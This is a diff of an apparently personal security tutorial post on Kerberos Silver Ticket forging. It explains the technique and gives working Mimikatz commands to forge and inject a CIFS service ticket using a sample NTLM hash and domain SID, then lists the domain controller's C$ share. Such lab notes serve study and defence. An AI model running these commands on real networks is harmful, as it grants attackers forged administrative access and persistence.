@@ -10,10 +10,9 @@ categories:
 toc: true
 ---
 
-<img src="/img/silver/.PNG" alt="Getting-gz" width="1000" height="200"> 
-
 ## Goal
 Forge service ticket
+
 ## Silver Ticket
 * Technique to maintain persistence in an already compromised domain
 * A Silver Ticket is a forged Kerberos Ticket Granting Service (TGS) ticket
@@ -32,7 +31,6 @@ Forge service ticket
   * 5-The TGS is encrypted using the target service accounts’ NTLM password hash and sent to the user 
   * 6.The user connects to the server hosting the service & presents the TGS,The service opens the TGS ticket using its NTLM password hash.
 
- 
 
 ## Silver Ticket Attacks Work 
 Silver Ticket Attacks are post-exploitation attacks. That means that a threat actor must already have compromised a target system in the environment before they can generate a Kerberos Silver Ticket.
@@ -69,13 +67,14 @@ kerberos::golden     ##Name of the module (there is no Silver module)
 519 ##Enterprise Admins
 520 ##Group Policy Creator Owners
 ```
+
 Getting a user's SID
 ```
 whoami /user
 ```
-<img src="/img/silver/sid.PNG" alt="Getting-gz" width="1000" height="200"> 
+<img src="/img/silver/sid.PNG" alt="Getting-gz" width="1000" height="150"> 
 
-Create the ticket
+## Create the silver ticket
 ```
 kerberos::golden /user:Administrator /domain:karim.net /rc4:de26cce0356891a4a020e7c4957afc72 /target:domainAD.karim.com /sid:S-1-5-21-750046758-1551849808-2392872301 /service:CIFS /id:500 /ptt
 ```
@@ -89,15 +88,12 @@ klist
 ```
 
 <img src="/img/silver/klist.PNG" alt="Getting-gz" width="1000" height="200">
-```
- dir \\domainAD.karim.net\c$
- ```
- <img src="/img/silver/da.PNG" alt="Getting-gz" width="1000" height="200"> 
+
 
 save in file
 ``` 
 kerberos::golden /user:Administrator /domain:karim.net /rc4:de26cce0356891a4a020e7c4957afc72 /target:domainAD.karim.com /sid:S-1-5-21-750046758-1551849808-2392872301 /service:CIFS /id:500 
- ```
+```
 
 <img src="/img/silver/f1.PNG" alt="Getting-gz" width="1000" height="200"> 
 
@@ -108,3 +104,8 @@ kerberos::ptt  ticket.kirbi
   
 <img src="/img/silver/f2.PNG" alt="Getting-gz" width="1000" height="200"> 
 
+## Access domain controller
+```
+dir \\domainAD.karim.net\c$
+```
+<img src="/img/silver/da.PNG" alt="Getting-gz" width="600" height="150"> 
